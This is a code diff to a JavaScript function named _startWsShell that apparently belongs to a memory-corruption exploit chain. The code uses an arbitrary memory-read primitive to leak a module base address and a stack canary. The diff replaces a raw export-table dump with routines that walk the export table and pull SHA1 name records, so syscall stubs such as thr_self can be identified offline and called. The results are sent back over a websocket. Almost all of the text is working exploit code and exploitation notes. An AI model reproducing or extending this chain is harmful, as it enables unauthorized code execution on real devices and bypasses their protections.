@@ -5482,19 +5482,30 @@ function _startWsShell(){
           if(!(can>0x1000000n)){reply.err='canary fail: 0x'+can.toString(16);break;}
           reply.base='0x'+B.toString(16);
           reply.canary='0x'+can.toString(16);
-          /* THE NID HARVEST: the export table at B+0x48000; dump the
-           * entries [512, 0x82C) (the first 512 banked in session 49 -
-           * entry #8 = the verified stub 0x410, lo=0xf49c) - the reply
-           * carries the raw entries for the offline NID hunt. */
+          /* v15 THE NAME-RECORD HARVEST: the call ABI is proven from the
+           * 1400 source (RSI = cfr hardcoded by the nativeCallTrampoline -
+           * the gettimeofday tz-write kills the frame deterministically;
+           * the tv-write lands FIRST every time). THE ROUTE: the entries'
+           * A-fields are offsets into the SECONDARY SECTION (table+0x416C),
+           * within the readable band; the records carry 20-byte SHA1s.
+           * Read the name records for the STUB-REGION entries (the low-text
+           * ladder where the syscall stubs live: 0xD0..0x1100-class), match
+           * offline against SHA1("thr_self") etc., identify the ONE-ARG
+           * stub (thr_self writes the TID to RDI - our scope - and touches
+           * NOTHING else), and call it. */
           var tbl=B+0x48000n;
-          var eAry=[];
-          for(var offE=0x1008;offE<0x4160;offE+=0x400){
-            var ew=S.absRead(tbl+BigInt(offE),0x400);
-            for(var wi3=0;wi3<ew.length;wi3++)eAry.push('0x'+ew[wi3].toString(16));
-            EW('6 entries +0x'+offE.toString(16)+' n='+eAry.length);
+          var nrecs=[];
+          for(var offN=0xC;offN<0x1000&&nrecs.length<400;offN+=8){
+            var e1=S.absRead(tbl+BigInt(offN),8)[0];
+            var aF=Number(e1>>32n);
+            var sR=Number(e1&0xFFFFFFFFn);
+            if(aF>=0x6000&&aF<0x16000){
+              var rec=S.absRead(tbl+0x416Cn+BigInt(aF),0x20);
+              nrecs.push({t:'0x'+(0x48000n+BigInt(BigInt.asUintN(32,BigInt(sR)))-0x100000000n>0n?BigInt(BigInt.asIntN(32,BigInt(sR))):BigInt(sR)).toString(16),a:'0x'+aF.toString(16),r:rec.map(function(w){return'0x'+w.toString(16);})});
+            }
           }
-          reply.entries=eAry;
-          EW('7 NID HARVEST DONE n='+eAry.length);
+          reply.nrecs=nrecs.slice(0,120);
+          EW('7 NAME RECORDS n='+nrecs.length);
         }catch(e2){reply.err='chain fault: '+String(e2&&e2.message?e2.message:'?');}
         break;
       }
